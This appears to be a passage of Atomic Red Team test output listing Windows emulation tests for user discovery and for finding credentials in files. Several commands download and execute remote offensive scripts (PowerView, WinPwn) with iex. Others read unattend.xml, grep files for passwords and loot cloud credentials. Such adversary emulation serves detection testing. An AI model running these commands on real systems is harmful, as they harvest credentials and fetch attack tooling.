Invoke-WebRequest https://github.com/tevora-threat/SharpView/blob/b60456286b41bb055ee7bc2a14d645410cca9b74/Compiled/SharpView.exe?raw=true -OutFile "C:\AtomicRedTeam\atomics\..\Exter
nalPayloads\SharpView.exe"
[!!!!!!!!END TEST!!!!!!!]


PathToAtomicsFolder = C:\AtomicRedTeam\atomics

[********BEGIN TEST*******]
Technique: System Owner/User Discovery T1033
Atomic Test Name: System Owner/User Discovery
Atomic Test Number: 1
Atomic Test GUID: 4c4959bf-addf-4b4a-be86-8d09cc1857aa
Description: Identify System owner or users on an endpoint.
Upon successful execution, cmd.exe will spawn multiple commands against a target host to identify usernames. Output will be via stdout.  Additionally, two files will be written to di
sk - computers.txt and usernames.txt.

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
cmd.exe /C whoami
wmic useraccount get /ALL
quser /SERVER:"#{computer_name}"
quser
qwinsta.exe /server:#{computer_name}
qwinsta.exe
for /F "tokens=1,2" %i in ('qwinsta /server:#{computer_name} ^| findstr "Active Disc"') do @echo %i | find /v "#" | find /v "console" || echo %j > computers.txt
@FOR /F %n in (computers.txt) DO @FOR /F "tokens=1,2" %i in ('qwinsta /server:%n ^| findstr "Active Disc"') do @echo %i | find /v "#" | find /v "console" || echo %j > usernames.txt
Command (with inputs):
cmd.exe /C whoami
wmic useraccount get /ALL
quser /SERVER:"localhost"
quser
qwinsta.exe /server:localhost
qwinsta.exe
for /F "tokens=1,2" %i in ('qwinsta /server:localhost ^| findstr "Active Disc"') do @echo %i | find /v "#" | find /v "console" || echo %j > computers.txt
@FOR /F %n in (computers.txt) DO @FOR /F "tokens=1,2" %i in ('qwinsta /server:%n ^| findstr "Active Disc"') do @echo %i | find /v "#" | find /v "console" || echo %j > usernames.txt
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: System Owner/User Discovery T1033
Atomic Test Name: Find computers where user has session - Stealth mode (PowerView)
Atomic Test Number: 3
Atomic Test GUID: 29857f27-a36f-4f7e-8084-4557cd6207ca
Description: Find existing user session on other computers. Upon execution, information about any sessions discovered will be displayed.

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-UserHunter -Stealth -V
erbose
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: System Owner/User Discovery T1033
Atomic Test Name: User Discovery With Env Vars PowerShell Script
Atomic Test Number: 4
Atomic Test GUID: dcb6cdee-1fb0-4087-8bf8-88cfd136ba51
Description: Use the PowerShell environment variables to identify the current logged user.

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
[System.Environment]::UserName | Out-File -FilePath .\CurrentactiveUser.txt 
$env:UserName | Out-File -FilePath .\CurrentactiveUser.txt -Append

Cleanup Commands:
Command:
Remove-Item -Path .\CurrentactiveUser.txt -Force
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: System Owner/User Discovery T1033
Atomic Test Name: GetCurrent User with PowerShell Script
Atomic Test Number: 5
Atomic Test GUID: 1392bd0f-5d5a-429e-81d9-eb9d4d4d5b3b
Description: Use the PowerShell "GetCurrent" method of the WindowsIdentity .NET class to identify the logged user.

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
[System.Security.Principal.WindowsIdentity]::GetCurrent() | Out-File -FilePath .\CurrentUserObject.txt

Cleanup Commands:
Command:
Remove-Item -Path .\CurrentUserObject.txt -Force
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: System Owner/User Discovery T1033
Atomic Test Name: System Discovery - SocGholish whoami
Atomic Test Number: 6
Atomic Test GUID: 3d257a03-eb80-41c5-b744-bb37ac7f65c7
Description: SocGholish performs whoami discovery commands and outputs the results to a tmp file.  The test will generate a filename similar to the random one generated during execut
ion and write the file to AppData\Temp.
Reference: https://redcanary.com/threat-detection-report/threats/socgholish/

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
$TokenSet = @{
  U = [Char[]]'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
  N = [Char[]]'0123456789'
}
$Upper = Get-Random -Count 5 -InputObject $TokenSet.U
$Number = Get-Random -Count 5 -InputObject $TokenSet.N
$StringSet = $Upper + $Number
$rad = (Get-Random -Count 5 -InputObject $StringSet) -join ''
$file = "rad" + $rad + ".tmp"

whoami.exe /all >> #{output_path}\$file
Command (with inputs):
$TokenSet = @{
  U = [Char[]]'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
  N = [Char[]]'0123456789'
}
$Upper = Get-Random -Count 5 -InputObject $TokenSet.U
$Number = Get-Random -Count 5 -InputObject $TokenSet.N
$StringSet = $Upper + $Number
$rad = (Get-Random -Count 5 -InputObject $StringSet) -join ''
$file = "rad" + $rad + ".tmp"

whoami.exe /all >> $env:temp\$file

Cleanup Commands:
Command:
Remove-Item -Path #{output_path}\rad*.tmp -Force
Command (with inputs):
Remove-Item -Path $env:temp\rad*.tmp -Force
[!!!!!!!!END TEST!!!!!!!]


PathToAtomicsFolder = C:\AtomicRedTeam\atomics

Found 0 atomic tests applicable to windows platform for Technique T1552
PathToAtomicsFolder = C:\AtomicRedTeam\atomics

[********BEGIN TEST*******]
Technique: Unsecured Credentials: Credentials In Files T1552.001
Atomic Test Name: Extracting passwords with findstr
Atomic Test Number: 4
Atomic Test GUID: 0e56bf29-ff49-4ea5-9af4-3b81283fd513
Description: Extracting Credentials from Files. Upon execution, the contents of files that contain the word "password" will be displayed.

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
findstr /si pass *.xml *.doc *.txt *.xls
ls -R | select-string -ErrorAction SilentlyContinue -Pattern password
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Unsecured Credentials: Credentials In Files T1552.001
Atomic Test Name: Access unattend.xml
Atomic Test Number: 5
Atomic Test GUID: 367d4004-5fc0-446d-823f-960c74ae52c3
Description: Attempts to access unattend.xml, where credentials are commonly stored, within the Panther directory where installation logs are stored. If these files exist, their cont
ents will be displayed. They are used to store credentials/answers during the unattended windows install process.

Attack Commands:
Executor: command_prompt
ElevationRequired: True
Command:
type C:\Windows\Panther\unattend.xml
type C:\Windows\Panther\Unattend\unattend.xml
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Unsecured Credentials: Credentials In Files T1552.001
Atomic Test Name: WinPwn - sensitivefiles
Atomic Test Number: 7
Atomic Test GUID: 114dd4e3-8d1c-4ea7-bb8d-8d8f6aca21f0
Description: Search for sensitive files on this local system using the SensitiveFiles function of WinPwn

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
sensitivefiles -noninteractive -consoleoutput
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Unsecured Credentials: Credentials In Files T1552.001
Atomic Test Name: WinPwn - Snaffler
Atomic Test Number: 8
Atomic Test GUID: fdd0c913-714b-4c13-b40f-1824d6c015f2
Description: Check Domain Network-Shares for cleartext passwords using Snaffler function of WinPwn

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
Snaffler -noninteractive -consoleoutput
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Unsecured Credentials: Credentials In Files T1552.001
Atomic Test Name: WinPwn - powershellsensitive
Atomic Test Number: 9
Atomic Test GUID: 75f66e03-37d3-4704-9520-3210efbe33ce
Description: Check Powershell event logs for credentials or other sensitive information via winpwn powershellsensitive function.

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
powershellsensitive -consoleoutput -noninteractive
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Unsecured Credentials: Credentials In Files T1552.001
Atomic Test Name: WinPwn - passhunt
Atomic Test Number: 10
Atomic Test GUID: 00e3e3c7-6c3c-455e-bd4b-461c7f0e7797
Description: Search for Passwords on this system using passhunt via WinPwn

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
passhunt -local $true -noninteractive

Cleanup Commands:
Command:
rm -force .\passhunt.exe -ErrorAction Ignore
rm -force .\phunter* -ErrorAction Ignore
rm -force -recurse .\DomainRecon -ErrorAction Ignore
rm -force -recurse .\Exploitation -ErrorAction Ignore
rm -force -recurse .\LocalPrivEsc -ErrorAction Ignore
rm -force -recurse .\LocalRecon -ErrorAction Ignore
rm -force -recurse .\Vulnerabilities -ErrorAction Ignore
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Unsecured Credentials: Credentials In Files T1552.001
Atomic Test Name: WinPwn - SessionGopher
Atomic Test Number: 11
Atomic Test GUID: c9dc9de3-f961-4284-bd2d-f959c9f9fda5
Description: Launches SessionGopher on this system via WinPwn

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
sessionGopher -noninteractive -consoleoutput
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Unsecured Credentials: Credentials In Files T1552.001
Atomic Test Name: WinPwn - Loot local Credentials - AWS, Microsoft Azure, and Google Compute credentials
Atomic Test Number: 12
Atomic Test GUID: aaa87b0e-5232-4649-ae5c-f1724a4b2798
Description: Loot local Credentials - AWS, Microsoft Azure, and Google Compute credentials technique via function of WinPwn

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
SharpCloud -consoleoutput -noninteractive
[!!!!!!!!END TEST!!!!!!!]

